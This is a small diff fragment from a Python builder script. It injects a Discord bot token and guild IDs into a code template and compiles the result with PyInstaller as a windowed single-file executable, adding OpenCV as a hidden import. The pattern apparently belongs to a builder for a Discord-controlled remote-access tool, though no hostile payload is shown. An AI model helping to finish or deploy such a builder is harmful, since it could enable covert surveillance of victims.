@@ -636,7 +636,7 @@ client.run(token)""".replace("~~TOKENHERE~~'", tokenbot + "'; g = [" + guildid +
 
             print(f'File creation...')
             time.sleep(1)
-            os.system(f"pyinstaller -y -F -w output/{fileName}.py")
+            os.system(f"pyinstaller -y -F -w --hidden-import cv2 output/{fileName}.py")
             clear()
             print(f'Cleaning up old files...')
             time.sleep(1)
